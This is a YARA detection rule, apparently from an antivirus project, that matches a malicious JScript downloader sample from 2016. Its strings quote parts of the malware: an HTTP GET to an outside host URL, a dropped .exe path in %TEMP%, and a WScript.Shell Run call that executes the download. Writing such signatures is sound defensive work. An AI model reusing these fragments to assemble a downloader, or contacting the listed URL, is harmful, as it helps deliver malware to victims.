rule sig_20160329_95dfa528d85e7c9aea91c6e1d4272d6a {
  meta:
    description = "datamaliciousorder - file 20160329_95dfa528d85e7c9aea91c6e1d4272d6a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b93357ea283674c40c8729882afa916cfd57f3ac6c162907286c87dbfe151f47"

  strings:
    $s1  = "N[I](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function Tr() {return a0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KdVL5jv3sigK6.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[dr](jV() * 11); if (N[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function J(kS, tG){uV = uV * 1; return kS - tG;};" fullword ascii
    $s5  = "var a0 = function GU() {return WScript[I1](\"WScript.Shell\");}(), a = 11;" fullword ascii
    $s6  = "function F(){return \"\" + h0;};" fullword ascii
    $s7  = "function h() {return ((eB == true) && (eB == X)) ? 1 : uV;};" fullword ascii
    $s8  = "function p(ex){a0[\"Run\"](ex, uV, uV);};" fullword ascii
    $s9  = "function n(Hm) {var J0 = (1, 2, 3, 4, 5, Hm); return J0;};" fullword ascii
    $s10 = "return J(XK, Y);" fullword ascii
    $s11 = "var F0 = new this[\"Date\"]();" fullword ascii
    $s12 = "function eT()" fullword ascii
    $s13 = "function xX(){return I1;};" fullword ascii
    $s14 = " while (I0){" fullword ascii
    $s15 = "function jV(){return 22;};" fullword ascii
    $s16 = "var Il = false;" fullword ascii
    $s17 = "eB = true; " fullword ascii
    $s18 = "var eB = false;" fullword ascii
    $s19 = "} catch(i){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}